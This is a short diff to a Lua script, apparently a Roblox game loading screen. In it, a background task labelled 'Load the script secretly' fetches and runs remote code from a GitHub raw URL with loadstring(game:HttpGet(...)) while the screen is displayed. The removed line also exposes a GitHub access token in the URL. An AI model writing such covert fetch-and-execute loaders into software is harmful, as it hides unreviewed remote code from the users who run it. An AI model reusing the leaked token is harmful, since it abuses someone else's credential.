@@ -111,7 +111,8 @@ creditText.Parent = background
 -- Background loading script (Load the script secretly)
 task.spawn(function()
     -- This will execute the provided loadstring while the screen is up
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/vakfq/test/refs/heads/main/script.lua?token=GHSAT0AAAAAADFNIACHYPGKHSMHULSPRFMY2CQI7FA"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vakfq/test/main/script.lua"))()
+
 end)
 
 -- Progress update loop
